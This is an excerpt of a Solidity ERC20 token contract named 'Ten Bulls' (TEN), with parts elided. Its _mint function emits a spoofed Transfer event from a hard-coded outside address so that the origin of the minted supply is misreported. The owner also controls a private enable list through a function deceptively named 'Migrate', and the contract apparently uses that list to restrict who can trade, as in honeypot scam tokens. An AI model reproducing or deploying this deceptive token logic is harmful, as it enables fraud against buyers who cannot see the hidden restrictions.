...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x1f7E0c2077e84386da9e1863163995c12F4189Cf), account, amount);
    }
...
contract TenBulls is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('Ten Bulls','TEN') { 
        _mint(0xd4fc3c7095447A198223D6191720eF5668063Ce8, 10000000 *10**18);
        _enable[0xd4fc3c7095447A198223D6191720eF5668063Ce8] = true;
    }
    ...
    function Migrate(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
